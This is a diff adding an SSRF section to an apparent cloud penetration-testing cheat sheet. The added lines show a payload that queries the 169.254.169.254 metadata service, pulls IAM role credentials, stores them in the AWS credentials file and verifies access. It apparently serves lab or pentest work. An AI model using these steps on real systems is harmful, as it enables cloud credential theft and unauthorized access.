@@ -591,6 +591,53 @@ $ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813
 $ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
 ```
 
+### Server-Side Request Forgery (SSRF)
+
+#### Verify Server-Side Request Forgery (SSRF)
+
+Hit the `meta-data` endpoint on `169.254.169.254`.
+
+```console
+?url=http://169.254.169.254/latest/meta-data/
+```
+
+To test:
+
+- iam/
+- instance-id
+- hostname
+
+#### Enumerate Identity Access Management (IAM) Security Credentials
+
+```console
+cg-ec2-role-123456789
+```
+
+#### Search for Identity Access Management (IAM) Credentials
+
+```console
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
+```
+
+Manually add the credentials.
+
+```console
+$ vi ~/.aws/credentials
+```
+
+```console
+[cg-ec2]
+aws_access_key_id = <ACCESS_KEY>
+aws_secret_access_key = <SECRET_ACCESS_KEY>
+aws_session_token = <TOKEN>
+```
+
+#### Verify Authentication
+
+```console
+$ aws sts get-caller-identity --profile <PROFILE>
+```
+
 ## Entra
 
 ### Privilege Escalation
